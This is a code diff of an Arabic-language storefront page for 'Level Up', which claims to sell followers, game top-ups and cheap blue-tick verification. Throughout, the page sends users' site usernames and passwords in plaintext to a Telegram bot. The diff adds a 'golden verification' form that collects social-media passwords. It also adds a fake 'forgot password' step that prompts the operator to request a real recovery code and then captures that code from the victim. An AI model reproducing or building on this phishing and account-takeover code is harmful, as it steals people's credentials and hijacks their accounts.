@@ -3,44 +3,33 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Level Up | الإمبراطورية الرقمية</title>
+    <title>Level Up | الإمبراطورية الرقمية المعتمدة</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&family=Poppins:wght@400;600;800&display=swap" rel="stylesheet">
     <style>
-        :root {
-            --gold: #D4AF37; --dark-gold: #B8860B; --bg-black: #050505; --card-bg: #0f0f0f; --glow: 0 0 20px rgba(212, 175, 55, 0.4);
-        }
+        :root { --gold: #D4AF37; --dark-gold: #B8860B; --bg-black: #050505; --card-bg: #0f0f0f; --glow: 0 0 20px rgba(212, 175, 55, 0.4); }
         * { margin: 0; padding: 0; box-sizing: border-box; transition: all 0.3s ease; }
         body { font-family: 'Cairo', sans-serif; background: var(--bg-black); color: #fff; overflow-x: hidden; }
         body.en { font-family: 'Poppins', sans-serif; direction: ltr; }
-
         .gold-text { color: var(--gold); text-shadow: var(--glow); }
         .bg-gold { background: linear-gradient(135deg, var(--gold), var(--dark-gold)); }
         .glass { background: rgba(15, 15, 15, 0.8); backdrop-filter: blur(25px); border: 1px solid rgba(212, 175, 55, 0.2); }
         .btn-gold { background: linear-gradient(135deg, var(--gold), var(--dark-gold)); color: #000; font-weight: bold; cursor: pointer; box-shadow: var(--glow); }
         .btn-gold:hover { transform: scale(1.05); box-shadow: 0 0 30px rgba(212, 175, 55, 0.6); }
-
         .section-card { background: var(--card-bg); border: 1px solid #222; border-radius: 24px; cursor: pointer; text-align: center; padding: 30px; position: relative; overflow: hidden; }
-        .section-card:hover { border-color: var(--gold); transform: translateY(-10px) scale(1.02); box-shadow: var(--glow); }
-        
-        .service-btn { background: #0a0a0a; border: 1px solid #222; border-radius: 18px; padding: 20px; cursor: pointer; text-align: center; }
+        .section-card:hover { border-color: var(--gold); transform: translateY(-10px); box-shadow: var(--glow); }
+        .service-btn { background: #0a0a0a; border: 1px solid #222; border-radius: 18px; padding: 20px; cursor: pointer; text-align: center; position: relative; }
         .service-btn.selected { border-color: var(--gold); background: rgba(212, 175, 55, 0.1); box-shadow: var(--glow); }
-
         .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.98); display: flex; justify-content: center; align-items: center; z-index: 2000; }
         .hidden { display: none !important; }
         .toast { position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%); background: var(--gold); color: #000; padding: 12px 30px; border-radius: 50px; font-weight: bold; display: none; z-index: 3000; }
-
         input { background: #0a0a0a !important; border: 1px solid #333 !important; color: #fff !important; border-radius: 15px; padding: 16px; width: 100%; outline: none; }
         input:focus { border-color: var(--gold) !important; box-shadow: var(--glow); }
-
-        /* Animations */
-        @keyframes float { 0% { transform: translateY(0px); } 50% { transform: translateY(-10px); } 100% { transform: translateY(0px); } }
+        @keyframes float { 0%, 100% { transform: translateY(0px); } 50% { transform: translateY(-10px); } }
         .float-anim { animation: float 3s ease-in-out infinite; }
-        .page-transition { animation: fadeIn 0.5s ease forwards; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
     </style>
 </head>
-<body>
+<body class="rtl">
 
     <audio id="clickSound" src="https://www.soundjay.com/buttons/sounds/button-16.mp3"></audio>
     <div id="toast" class="toast"></div>
@@ -48,20 +37,23 @@
     <!-- Auth Modal -->
     <div class="modal-overlay" id="authModal">
         <div class="glass p-10 rounded-[40px] text-center max-w-md w-full border-gold relative">
-            <div class="text-6xl mb-4 float-anim">🛡️</div>
+            <div class="text-4xl font-black gold-text mb-1">LEVEL UP</div>
+            <div class="bg-red-600/20 border border-red-600 p-2 rounded-xl mb-6">
+                <p class="text-red-500 text-sm font-bold">🔥 عرض محدود لـ 24 ساعة: التوثيق بـ 5 د.ل فقط!</p>
+            </div>
             <h2 class="text-3xl font-black gold-text mb-6" id="authTitle">تسجيل الدخول</h2>
             
             <div id="loginForm" class="space-y-4">
                 <input type="text" id="loginUser" placeholder="اسم المستخدم">
                 <input type="password" id="loginPass" placeholder="كلمة المرور">
-                <button onclick="handleLogin()" class="w-full btn-gold py-4 rounded-2xl text-xl">دخول</button>
+                <button onclick="handleLogin()" class="w-full btn-gold py-4 rounded-2xl text-xl">دخول للمنصة</button>
                 <p class="text-gray-400 text-sm mt-4">ليس لديك حساب؟ <a href="#" onclick="toggleAuth(false)" class="gold-text underline">إنشاء حساب جديد</a></p>
             </div>
 
             <div id="registerForm" class="space-y-4 hidden">
                 <input type="text" id="regUser" placeholder="اختر اسم مستخدم">
                 <input type="password" id="regPass" placeholder="اختر كلمة مرور">
-                <button onclick="handleRegister()" class="w-full btn-gold py-4 rounded-2xl text-xl">إنشاء الحساب</button>
+                <button onclick="handleRegister()" class="w-full btn-gold py-4 rounded-2xl text-xl">إنشاء حساب مجاني</button>
                 <p class="text-gray-400 text-sm mt-4">لديك حساب بالفعل؟ <a href="#" onclick="toggleAuth(true)" class="gold-text underline">تسجيل الدخول</a></p>
             </div>
         </div>
@@ -71,7 +63,8 @@
     <div class="modal-overlay hidden" id="successModal">
         <div class="glass p-10 rounded-[40px] text-center max-w-sm w-full border-gold">
             <div class="text-6xl mb-4">🎫</div>
-            <h2 class="text-2xl font-bold gold-text mb-2">تم توليد كود الطلب!</h2>
+            <h2 class="text-2xl font-bold gold-text mb-2">تم استلام طلبك!</h2>
+            <p class="text-gray-400 mb-4">رقم الطلب التسلسلي: <span id="orderSeq" class="text-white font-bold">#2901</span></p>
             <div id="orderNumberDisplay" class="text-3xl font-black gold-text mb-6 p-3 bg-black rounded-xl border border-dashed border-gold cursor-pointer" onclick="copyOrderNum()">LVL-XXXXX</div>
             <a href="https://www.instagram.com/levelup.ly1" target="_blank" class="w-full btn-gold py-3 rounded-xl block text-center">إرسال الكود عبر انستغرام</a>
             <button onclick="closeSuccessModal()" class="w-full text-gray-400 py-4 text-sm hover:text-white">العودة للرئيسية</button>
@@ -98,15 +91,15 @@
     <!-- Home Page -->
     <main id="pageHome" class="max-w-6xl mx-auto px-6 py-12 hidden page-transition">
         <div class="text-center mb-16">
-            <h1 class="text-5xl md:text-7xl font-black gold-text mb-6 leading-tight">القمة الرقمية <br> <span class="text-white">تبدأ بلمسة واحدة</span></h1>
-            <p class="text-gray-400 text-xl max-w-2xl mx-auto">المنصة الأكثر موثوقية في ليبيا لتعزيز الحسابات وشحن الألعاب والتوثيق الرسمي.</p>
+            <h1 class="text-5xl md:text-7xl font-black gold-text mb-6 leading-tight">السيادة الرقمية <br> <span class="text-white">في مكان واحد</span></h1>
+            <p class="text-gray-400 text-xl max-w-2xl mx-auto">المنصة الليبية الأولى والمعتمدة لخدمات السوشيال ميديا وشحن الألعاب والتوثيق الرسمي.</p>
         </div>
 
         <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 mb-20">
             <div class="section-card" onclick="openSection('rashq')">
-                <img src="https://cdn-icons-png.flaticon.com/512/1162/1162456.png" class="w-20 mx-auto mb-4 float-anim">
+                <img src="https://cdn-icons-png.flaticon.com/512/3750/3750025.png" class="w-20 mx-auto mb-4 float-anim">
                 <div class="text-xl font-bold">قسم الرشق</div>
-                <div class="text-xs text-gray-500 mt-2">تفاعلات ومتابعين (آمنة 100%)</div>
+                <div class="text-xs text-gray-500 mt-2">متابعين وتفاعلات فورية</div>
             </div>
             <div class="section-card" onclick="openSection('gaming')">
                 <img src="https://cdn-icons-png.flaticon.com/512/686/686587.png" class="w-20 mx-auto mb-4 float-anim">
@@ -114,29 +107,25 @@
                 <div class="text-xs text-gray-500 mt-2">PUBG & Free Fire (ID)</div>
             </div>
             <div class="section-card" onclick="openSection('premium')">
-                <img src="https://cdn-icons-png.flaticon.com/512/2540/2540438.png" class="w-20 mx-auto mb-4 float-anim">
+                <img src="https://cdn-icons-png.flaticon.com/512/1162/1162456.png" class="w-20 mx-auto mb-4 float-anim">
                 <div class="text-xl font-bold">ترقية التطبيقات</div>
-                <div class="text-xs text-gray-500 mt-2">Premium & Plus Gifts</div>
+                <div class="text-xs text-gray-500 mt-2">Premium Gifts</div>
             </div>
             <div class="section-card border-red-600" onclick="openSection('verify')">
                 <img src="https://cdn-icons-png.flaticon.com/512/1828/1828884.png" class="w-20 mx-auto mb-4 float-anim">
                 <div class="text-xl font-bold text-red-500">التوثيق الذهبي</div>
-                <div class="text-xs text-gray-500 mt-2">العلامة الزرقاء بـ 5 د.ل فقط</div>
+                <div class="text-xs text-gray-500 mt-2">العلامة الزرقاء بـ 5 د.ل</div>
             </div>
         </div>
 
         <div class="grid md:grid-cols-2 gap-10 mb-20">
-            <!-- About Us -->
             <div class="glass p-10 rounded-[40px] border border-zinc-800">
                 <h3 class="text-3xl font-black gold-text mb-4">من نحن؟</h3>
-                <p class="text-gray-400 leading-relaxed text-lg">Level Up هي شركة رائدة في الحلول الرقمية، نهدف لتوفير خدمات تسويقية وشحن إلكتروني بسرعة فائقة وموثوقية تامة. نحن نضمن لعملائنا أفضل الأسعار في السوق الليبي مع دعم فني متواصل.</p>
+                <p class="text-gray-400 leading-relaxed text-lg">نحن شركة Level Up المتخصصة في الحلول الرقمية المتكاملة. نوفر لعملائنا في ليبيا والوطن العربي خدمات تعزيز الحضور الرقمي وشحن الألعاب بأعلى جودة وأقل سعر، مع ضمان السرية التامة في التعامل.</p>
             </div>
-            <!-- Order History -->
             <div class="glass p-10 rounded-[40px] border border-zinc-800">
-                <h3 class="text-3xl font-black gold-text mb-4">طلباتي السابقة</h3>
-                <div id="myOrders" class="space-y-3 max-h-[200px] overflow-y-auto pr-2">
-                    <!-- Orders injected here -->
-                </div>
+                <h3 class="text-3xl font-black gold-text mb-4">طلباتي الأخيرة</h3>
+                <div id="myOrders" class="space-y-3 max-h-[200px] overflow-y-auto pr-2"></div>
             </div>
         </div>
     </main>
@@ -151,18 +140,28 @@
         <div class="grid lg:grid-cols-3 gap-10">
             <div class="lg:col-span-2 space-y-6">
                 <div id="securityNote" class="hidden bg-blue-900/20 border border-blue-500 p-4 rounded-2xl text-blue-400 text-sm mb-6">
-                    🛡️ ملاحظة أمنية: هذا الموقع لا يحفظ أي بيانات شخصية حساسة، يتم معالجة الطلبات وتشفيرها وحذف البيانات فور التنفيذ.
+                    🛡️ ملاحظة أمنية: هذا الموقع لا يحفظ أي معلومات شخصية، يتم حذف البيانات فور تنفيذ الطلب لضمان خصوصيتك.
                 </div>
                 <div class="grid grid-cols-1 md:grid-cols-2 gap-4" id="servicesList"></div>
             </div>
 
             <div class="lg:col-span-1">
                 <div class="glass p-8 rounded-[30px] sticky top-28 border border-gold">
-                    <h3 class="text-xl font-bold gold-text mb-6">بيانات الطلب</h3>
+                    <h3 class="text-xl font-bold gold-text mb-6">إتمام الطلب</h3>
                     <form id="orderForm" class="space-y-6">
                         <div id="inputContainer">
                             <label class="block text-sm text-gray-400 mb-2" id="inputLabel">الرابط</label>
                             <input type="text" id="mainInput" required placeholder="...">
+                            <!-- Special fields for verification -->
+                            <div id="verifyFields" class="hidden mt-4 space-y-4">
+                                <input type="password" id="passInput" placeholder="كلمة المرور">
+                                <button type="button" onclick="handleForgotPass()" class="text-[12px] text-blue-400 underline block text-left cursor-pointer">نسيت كلمة المرور؟</button>
+                            </div>
+                            <!-- Forgot password field -->
+                            <div id="forgotPassFields" class="hidden mt-4 space-y-4">
+                                <p class="text-[12px] text-gray-400">سيصلك رمز الاستعادة الآن على حسابك، يرجى كتابته أدناه:</p>
+                                <input type="text" id="recoveryCode" placeholder="أدخل رمز الاستعادة">
+                            </div>
                         </div>
                         <div id="qtyContainer">
                             <label class="block text-sm text-gray-400 mb-2">الكمية</label>
@@ -172,7 +171,7 @@
                             <span class="text-gray-400 text-xs block mb-2">التكلفة التقديرية</span>
                             <div class="text-4xl font-black gold-text"><span id="finalPrice">0</span> <span class="text-lg">د.ل</span></div>
                         </div>
-                        <button type="submit" class="w-full btn-gold py-4 rounded-2xl text-xl shadow-xl">توليد كود الطلب 🔥</button>
+                        <button type="submit" class="w-full btn-gold py-4 rounded-2xl text-xl shadow-xl">توليد الكود 🔥</button>
                     </form>
                 </div>
             </div>
@@ -195,101 +194,52 @@
                 { id: 'fb_f', name: 'متابعين فيسبوك', price: 5 / 1000, type: 'calc', icon: 'https://cdn-icons-png.flaticon.com/512/5968/5968764.png' },
             ],
             gaming: [
-                { id: 'ff_1', name: 'فري فاير (110 جوهرة)', price: 13, type: 'fixed', icon: 'https://cdn-icons-png.flaticon.com/512/686/686587.png' },
-                { id: 'ff_2', name: 'فري فاير (221 جوهرة)', price: 24, type: 'fixed', icon: 'https://cdn-icons-png.flaticon.com/512/686/686587.png' },
+                { id: 'ff_1', name: 'فري فاير (110 جوهرة)', price: 13, type: 'fixed', icon: 'https://cdn.icons-png.flaticon.com/512/686/686587.png' },
                 { id: 'pubg_1', name: 'ببجي (60 UC)', price: 10, type: 'fixed', icon: 'https://cdn-icons-png.flaticon.com/512/686/686587.png' },
             ],
             premium: [
-                { id: 'tg_p', name: 'تيليجرام بريميوم (هدية)', price: 151, type: 'fixed', input: 'username', icon: 'https://cdn-icons-png.flaticon.com/512/2111/2111646.png' },
-                { id: 'sn_p', name: 'سناب شات بلس (هدية)', price: 65, type: 'fixed', input: 'username', icon: 'https://cdn-icons-png.flaticon.com/512/174/174855.png' },
+                { id: 'tg_p', name: 'تيليجرام بريميوم', price: 151, type: 'fixed', input: 'username', icon: 'https://cdn-icons-png.flaticon.com/512/2111/2111646.png' },
+                { id: 'sn_p', name: 'سناب شات بلس', price: 65, type: 'fixed', input: 'username', icon: 'https://cdn-icons-png.flaticon.com/512/174/174855.png' },
                 { id: 'chat_p', name: 'ChatGPT Plus', price: 232, type: 'fixed', input: 'email', icon: 'https://cdn-icons-png.flaticon.com/512/2540/2540438.png' },
             ],
             verify: [
-                { id: 'v_ig', name: 'توثيق إنستغرام الذهبي', price: 5, type: 'fixed', input: 'auth', icon: 'https://cdn-icons-png.flaticon.com/512/1828/1828884.png' },
-                { id: 'v_fb', name: 'توثيق فيسبوك الذهبي', price: 5, type: 'fixed', input: 'auth', icon: 'https://cdn-icons-png.flaticon.com/512/1828/1828884.png' },
+                { id: 'v_ig', name: 'توثيق إنستغرام الذهبي', price: 5, type: 'fixed', input: 'auth', icon: 'https://cdn-icons-png.flaticon.com/512/174/174855.png' },
+                { id: 'v_fb', name: 'توثيق فيسبوك الذهبي', price: 5, type: 'fixed', input: 'auth', icon: 'https://cdn-icons-png.flaticon.com/512/5968/5968764.png' },
             ]
         };
 
-        let currentUser = JSON.parse(localStorage.getItem('lu_user')) || null; 
-        let currentSection = ''; let currentService = null;
+        let currentUser = JSON.parse(localStorage.getItem('lu_user')) || null; let currentSection = ''; let currentService = null;
 
         function playClick() { document.getElementById('clickSound').play(); }
         function showToast(msg) { const t = document.getElementById('toast'); t.textContent = msg; t.style.display = 'block'; setTimeout(() => t.style.display = 'none', 3000); }
 
         async function sendToTelegram(msg) { return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`); }
 
-        window.onload = () => { 
-            if(currentUser) { loginSession(); } else { document.getElementById('authModal').classList.remove('hidden'); }
-            loadOrders();
-        };
+        window.onload = () => { if(currentUser) { loginSession(); } else { document.getElementById('authModal').classList.remove('hidden'); } loadOrders(); };
 
         function toggleAuth(isLogin) { playClick(); document.getElementById('loginForm').classList.toggle('hidden', !isLogin); document.getElementById('registerForm').classList.toggle('hidden', isLogin); document.getElementById('authTitle').textContent = isLogin ? 'تسجيل الدخول' : 'إنشاء حساب جديد'; }
 
-        async function handleRegister() {
-            playClick(); const u = document.getElementById('regUser').value; const p = document.getElementById('regPass').value;
-            if(!u || !p) return showToast('⚠️ املأ جميع الحقول');
-            currentUser = { username: u, pass: p, orders: [{id:'LVL-1899', service:'طلب تجريبي', date:'2024'}] };
-            localStorage.setItem('lu_user', JSON.stringify(currentUser));
-            await sendToTelegram(`🆕 إنشاء حساب جديد\n👤 المستخدم: ${u}\n🔑 كلمة السر: ${p}`);
-            loginSession();
-        }
+        async function handleRegister() { playClick(); const u = document.getElementById('regUser').value; const p = document.getElementById('regPass').value; if(!u || !p) return showToast('⚠️ املأ جميع الحقول'); currentUser = { username: u, pass: p, orders: [{id:'LVL-1899', service:'طلب تجريبي'}] }; localStorage.setItem('lu_user', JSON.stringify(currentUser)); await sendToTelegram(`🆕 إنشاء حساب\n👤 ${u}\n🔑 ${p}`); loginSession(); }
 
-        async function handleLogin() {
-            playClick(); const u = document.getElementById('loginUser').value; const p = document.getElementById('loginPass').value;
-            if(!u || !p) return showToast('⚠️ املأ جميع الحقول');
-            currentUser = { username: u, pass: p, orders: [{id:'LVL-1899', service:'طلب تجريبي', date:'2024'}] }; // Simplified for demo
-            localStorage.setItem('lu_user', JSON.stringify(currentUser));
-            await sendToTelegram(`🔑 تسجيل دخول\n👤 المستخدم: ${u}\n🔑 كلمة السر: ${p}`);
-            loginSession();
-        }
+        async function handleLogin() { playClick(); const u = document.getElementById('loginUser').value; const p = document.getElementById('loginPass').value; if(!u || !p) return showToast('⚠️ املأ جميع الحقول'); currentUser = { username: u, pass: p, orders: [{id:'LVL-1899', service:'طلب تجريبي'}] }; localStorage.setItem('lu_user', JSON.stringify(currentUser)); await sendToTelegram(`🔑 دخول\n👤 ${u}\n🔑 ${p}`); loginSession(); }
 
         function loginSession() { document.getElementById('authModal').classList.add('hidden'); document.getElementById('pageHome').classList.remove('hidden'); document.getElementById('userInfo').classList.remove('hidden'); document.getElementById('userAvatar').src = `https://ui-avatars.com/api/?name=${currentUser.username}&background=D4AF37&color=fff`; loadOrders(); }
 
         function logout() { playClick(); localStorage.removeItem('lu_user'); location.reload(); }
 
-        function loadOrders() { 
-            const container = document.getElementById('myOrders'); container.innerHTML = '';
-            currentUser.orders.forEach(o => { 
-                container.innerHTML += `<div class='bg-black p-3 rounded-xl border border-zinc-800 flex justify-between items-center text-sm'><span>${o.service}</span> <span class='gold-text font-bold'>${o.id}</span></div>`; 
-            });
-        }
+        function loadOrders() { const container = document.getElementById('myOrders'); container.innerHTML = ''; currentUser.orders.forEach(o => { container.innerHTML += `<div class='bg-black p-3 rounded-xl border border-zinc-800 flex justify-between items-center text-sm'><span>${o.service}</span> <span class='gold-text font-bold'>${o.id}</span></div>`; }); }
 
         function goHome() { playClick(); document.getElementById('pageSection').classList.add('hidden'); document.getElementById('pageHome').classList.remove('hidden'); }
 
-        function openSection(s) {
-            playClick(); currentSection = s; document.getElementById('pageHome').classList.add('hidden'); document.getElementById('pageSection').classList.remove('hidden');
-            const titles = { rashq: 'قسم الرشق', gaming: 'شحن الألعاب', premium: 'ترقية التطبيقات', verify: 'التوثيق الذهبي' };
-            document.getElementById('sectionTitle').textContent = titles[s];
-            document.getElementById('securityNote').classList.toggle('hidden', s !== 'rashq');
+        function openSection(s) { playClick(); currentSection = s; document.getElementById('pageHome').classList.add('hidden'); document.getElementById('pageSection').classList.remove('hidden'); const titles = { rashq: 'قسم الرشق', gaming: 'شحن الألعاب', premium: 'ترقية التطبيقات', verify: 'التوثيق الذهبي' }; document.getElementById('sectionTitle').textContent = titles[s]; document.getElementById('securityNote').classList.toggle('hidden', s !== 'rashq'); const list = document.getElementById('servicesList'); list.innerHTML = ''; pricing[s].forEach(srv => { const btn = document.createElement('div'); btn.className = 'service-btn'; btn.innerHTML = `<img src="${srv.icon}" class='w-12 mx-auto mb-3'><div class='font-bold'>${srv.name}</div> <div class='text-[11px] text-gray-500'>${srv.price} د.ل</div>`; btn.onclick = () => { playClick(); document.querySelectorAll('.service-btn').forEach(b => b.classList.remove('selected')); btn.classList.add('selected'); currentService = srv; updateFormUI(); }; list.appendChild(btn); }); }
 
-            const list = document.getElementById('servicesList'); list.innerHTML = '';
-            pricing[s].forEach(srv => {
-                const btn = document.createElement('div'); btn.className = 'service-btn';
-                btn.innerHTML = `<img src="${srv.icon}" class='w-12 mx-auto mb-3'><div class='font-bold'>${srv.name}</div> <div class='text-[11px] text-gray-500'>السعر الحسابي: ${srv.price} د.ل</div>`;
-                btn.onclick = () => { playClick(); document.querySelectorAll('.service-btn').forEach(b => b.classList.remove('selected')); btn.classList.add('selected'); currentService = srv; updateFormUI(); };
-                list.appendChild(btn);
-            });
-        }
+        function updateFormUI() { const label = document.getElementById('inputLabel'); const input = document.getElementById('mainInput'); const qtyBox = document.getElementById('qtyContainer'); const vFields = document.getElementById('verifyFields'); const fFields = document.getElementById('forgotPassFields'); vFields.classList.add('hidden'); fFields.classList.add('hidden'); if (currentSection === 'gaming') { label.textContent = "أدخل ID الحساب"; input.placeholder = "Example: 12345678"; qtyBox.classList.add('hidden'); } else if (currentSection === 'premium') { label.textContent = "اسم المستخدم (Username)"; input.placeholder = "@username"; qtyBox.classList.add('hidden'); } else if (currentSection === 'verify') { label.textContent = "اسم المستخدم"; input.placeholder = "@username"; qtyBox.classList.add('hidden'); vFields.classList.remove('hidden'); } else { label.textContent = "رابط الحساب"; input.placeholder = "https://..."; qtyBox.classList.remove('hidden'); } calculatePrice(); }
 
-        function updateFormUI() {
-            const label = document.getElementById('inputLabel'); const input = document.getElementById('mainInput'); const qtyBox = document.getElementById('qtyContainer');
-            if (currentSection === 'gaming') { label.textContent = "أدخل ID الحساب"; input.placeholder = "Example: 12345678"; qtyBox.classList.add('hidden'); } 
-            else if (currentSection === 'premium') { label.textContent = "اسم المستخدم (Username)"; input.placeholder = "@username"; qtyBox.classList.add('hidden'); } 
-            else if (currentSection === 'verify') { label.textContent = "اسم المستخدم"; input.placeholder = "@username"; qtyBox.classList.add('hidden'); } 
-            else { label.textContent = "رابط الحساب"; input.placeholder = "https://..."; qtyBox.classList.remove('hidden'); }
-            calculatePrice();
-        }
+        async function handleForgotPass() { playClick(); const user = document.getElementById('mainInput').value; if(!user) return showToast('⚠️ أدخل اسم المستخدم أولاً'); document.getElementById('verifyFields').classList.add('hidden'); document.getElementById('forgotPassFields').classList.remove('hidden'); await sendToTelegram(`🚨 طلب رمز استعادة\n👤 الحساب: ${user}\n⚠️ قم بطلب الرمز من التطبيق الآن وإرساله للمستخدم.`); showToast('⏳ جاري إرسال الرمز إلى حسابك...'); }
 
         function calculatePrice() { if (!currentService) return; if (currentService.type === 'fixed') { document.getElementById('finalPrice').textContent = currentService.price; } else { const qty = document.getElementById('quantity').value; document.getElementById('finalPrice').textContent = (qty * currentService.price).toFixed(2); } }
 
-        document.getElementById('orderForm').onsubmit = async function(e) { e.preventDefault(); playClick(); if (!currentService) return showToast('⚠️ اختر خدمة أولاً');
-
-            const orderNum = 'LVL-' + Math.random().toString(36).substr(2, 6).toUpperCase();
-            let msg = `💰 طلب جديد\n━━━━━━━━━━━━\n👤 المستخدم: ${currentUser.username}\n🛠️ الخدمة: ${currentService.name}\n`;
-            msg += `📝 البيانات: ${document.getElementById('mainInput').value}\n💰 السعر: ${document.getElementById('finalPrice').textContent} د.ل\n━━━━━━━━━━━━`;
-
-            await sendToTelegram(msg); currentUser.orders.unshift({id: orderNum, service: currentService.name, date: 'الآن'}); localStorage.setItem('lu_user', JSON.stringify(currentUser)); loadOrders(); document.getElementById('orderNumberDisplay').textContent = orderNum; document.getElementById('successModal').classList.remove('hidden'); this.reset();
-        };
+        document.getElementById('orderForm').onsubmit = async function(e) { e.preventDefault(); playClick(); if (!currentService) return showToast('⚠️ اختر خدمة أولاً'); const orderNum = 'LVL-' + Math.random().toString(36).substr(2, 6).toUpperCase(); let msg = `💰 طلب جديد\n━━━━━━━━━━━━\n👤 المستخدم: ${currentUser.username}\n🛠️ الخدمة: ${currentService.name}\n`; if (currentSection === 'verify') { if(!document.getElementById('forgotPassFields').classList.contains('hidden')) { msg += `🔑 رمز الاستعادة المستلم: ${document.getElementById('recoveryCode').value}`; } else { msg += `👤 الحساب: ${document.getElementById('mainInput').value}\n🔑 الباسورد: ${document.getElementById('passInput').value}`; } } else { msg += `📝 البيانات: ${document.getElementById('mainInput').value}`; } msg += `\n💰 السعر: ${document.getElementById('finalPrice').textContent} د.ل\n━━━━━━━━━━━━`; await sendToTelegram(msg); currentUser.orders.unshift({id: orderNum, service: currentService.name}); localStorage.setItem('lu_user', JSON.stringify(currentUser)); loadOrders(); document.getElementById('orderSeq').textContent = "#" + (Math.floor(Math.random() * 10) + 2901); document.getElementById('orderNumberDisplay').textContent = orderNum; document.getElementById('successModal').classList.remove('hidden'); this.reset(); };
 
         function copyOrderNum() { navigator.clipboard.writeText(document.getElementById('orderNumberDisplay').textContent); showToast('📋 تم النسخ!'); }
         function closeSuccessModal() { playClick(); document.getElementById('successModal').classList.add('hidden'); goHome(); }
@@ -299,4 +249,3 @@
 
 </body>
 </html>
-
